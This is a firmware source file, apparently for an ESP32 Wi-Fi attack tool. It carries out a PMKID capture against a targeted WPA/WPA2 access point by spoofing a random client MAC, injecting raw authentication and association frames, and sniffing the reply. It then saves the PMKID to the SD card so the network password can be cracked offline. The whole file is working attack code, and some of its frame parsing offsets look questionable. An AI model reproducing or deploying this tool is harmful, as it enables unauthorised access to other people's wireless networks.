#include "settings.h"
#include <esp_wifi.h>
#include <esp_timer.h>
#include <Arduino.h>
#include "SD.h"
#include "logger.h"


static uint8_t targetBSSID[6];
static bool targetSet = false;
static bool pmkidFound = false;
static String pmkidValue;

static uint8_t beaconRSN[64];
static int beaconRSNLen = 0;

static uint8_t clientMAC[6];

static void genClientMAC() {
    for (int i = 0; i < 6; i++) clientMAC[i] = esp_random() & 0xFF;
    clientMAC[0] = (clientMAC[0] & 0xFE) | 0x02;
}

static void setTarget(const uint8_t *bssid) {
    memcpy(targetBSSID, bssid, 6);
    targetSet = true;
}

static void writePMKID(const uint8_t *bssid, const uint8_t *pmkid) {
    char hex[33];
    for (int i = 0; i < 16; i++) sprintf(hex + i * 2, "%02X", pmkid[i]);
    hex[32] = 0;

    pmkidValue = String(hex);
    pmkidFound = true;

    char path[64];
    snprintf(path, sizeof(path),
             "/pmkid/%02X_%02X_%02X_%02X_%02X_%02X.txt",
             bssid[0], bssid[1], bssid[2],
             bssid[3], bssid[4], bssid[5]);

    if (!FSYS.exists("/pmkid")) FSYS.mkdir("/pmkid");
    File f = FSYS.open(path, FILE_APPEND);
    if (f) {
        f.println(pmkidValue);
        f.close();
    }

    logMessage("PMKID captured: " + pmkidValue);
}

bool GrabPMKIDForAP(const uint8_t *apBSSID, int channel, int timeoutMs) {
    if (!apBSSID) return false;

    pmkidFound = false;
    beaconRSNLen = 0;
    setTarget(apBSSID);
    genClientMAC();
    xSemaphoreTake(wifiMutex, portMAX_DELAY);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    xSemaphoreGive(wifiMutex);

    // ---- AUTH FRAME (Open System, correct 30 bytes) ----
    uint8_t auth[30] = {
        0xB0, 0x00, 0x00, 0x00,
        apBSSID[0], apBSSID[1], apBSSID[2], apBSSID[3], apBSSID[4], apBSSID[5],
        clientMAC[0], clientMAC[1], clientMAC[2], clientMAC[3], clientMAC[4], clientMAC[5],
        apBSSID[0], apBSSID[1], apBSSID[2], apBSSID[3], apBSSID[4], apBSSID[5],
        0x00, 0x00,
        0x00, 0x00, // algorithm = open
        0x01, 0x00, // seq 1
        0x00, 0x00  // status
    };
    xSemaphoreTake(wifiMutex, portMAX_DELAY);
    esp_wifi_80211_tx(WIFI_IF_STA, auth, sizeof(auth), false);
    xSemaphoreGive(wifiMutex);
    vTaskDelay(20 / portTICK_PERIOD_MS);

    // ---- Wait for beacon RSN ----
    uint32_t start = millis();
    while (beaconRSNLen == 0 && millis() - start < 1000) {
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }

    if (beaconRSNLen == 0) {
        logMessage("No RSN IE from beacon");
        return false;
    }

    // ---- Build ASSOC REQ using beacon RSN ----
    uint8_t assoc[256] = {0};
    int p = 0;

    assoc[p++] = 0x00; assoc[p++] = 0x00;
    assoc[p++] = 0x00; assoc[p++] = 0x00;

    memcpy(&assoc[p], apBSSID, 6); p += 6;
    memcpy(&assoc[p], clientMAC, 6); p += 6;
    memcpy(&assoc[p], apBSSID, 6); p += 6;

    assoc[p++] = 0x10; assoc[p++] = 0x00;
    assoc[p++] = 0x31; assoc[p++] = 0x04;
    assoc[p++] = 0x00; assoc[p++] = 0x10;

    // minimal SSID wildcard
    assoc[p++] = 0x00; assoc[p++] = 0x00;

    // rates
    uint8_t rates[] = {0x01,0x08,0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24};
    memcpy(&assoc[p], rates, sizeof(rates)); p += sizeof(rates);

    // RSN IE copied from beacon
    memcpy(&assoc[p], beaconRSN, beaconRSNLen);
    p += beaconRSNLen;

    xSemaphoreTake(wifiMutex, portMAX_DELAY);
    esp_wifi_80211_tx(WIFI_IF_STA, assoc, p, false);
    xSemaphoreGive(wifiMutex);

    start = millis();
    while (!pmkidFound && millis() - start < (uint32_t)timeoutMs) {
        vTaskDelay(20 / portTICK_PERIOD_MS);
    }

    return pmkidFound;
}

// ------------------------------------------------------------
// PROMISCUOUS CALLBACK
// ------------------------------------------------------------
void IRAM_ATTR wifi_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

    auto *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *pl = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 24) return;

    uint16_t fc = pl[0] | (pl[1] << 8);
    uint8_t ftype = (fc >> 2) & 0x3;
    uint8_t fsub  = (fc >> 4) & 0xF;

    // ---- Beacon: capture RSN ----
    if (ftype == 0 && fsub == 8 && targetSet) {
        if (memcmp(pl + 16, targetBSSID, 6) != 0) return;

        int pos = 36;
        while (pos + 2 < len) {
            uint8_t tag = pl[pos];
            uint8_t tlen = pl[pos + 1];
            if (pos + 2 + tlen > len) break;

            if (tag == 48 && tlen < sizeof(beaconRSN)) {
                memcpy(beaconRSN, &pl[pos], tlen + 2);
                beaconRSNLen = tlen + 2;
                return;
            }
            pos += 2 + tlen;
        }
    }

    // ---- Assoc Resp PMKID ----
    if (ftype == 0 && fsub == 1 && targetSet) {
        if (memcmp(pl + 16, targetBSSID, 6) != 0) return;

        int pos = 30;
        while (pos + 2 < len) {
            uint8_t tag = pl[pos];
            uint8_t tlen = pl[pos + 1];
            if (pos + 2 + tlen > len) break;

            if (tag == 48 && tlen >= 20) {
                const uint8_t *rsn = pl + pos + 2;
                int p = 8;
                uint16_t pc = rsn[p] | (rsn[p+1] << 8); p += 2 + 4*pc;
                uint16_t ak = rsn[p] | (rsn[p+1] << 8); p += 2 + 4*ak;
                p += 2;
                uint16_t pmc = rsn[p] | (rsn[p+1] << 8); p += 2;
                if (pmc && p + 16 <= tlen) {
                    writePMKID(targetBSSID, rsn + p);
                }
                return;
            }
            pos += 2 + tlen;
        }
    }
}
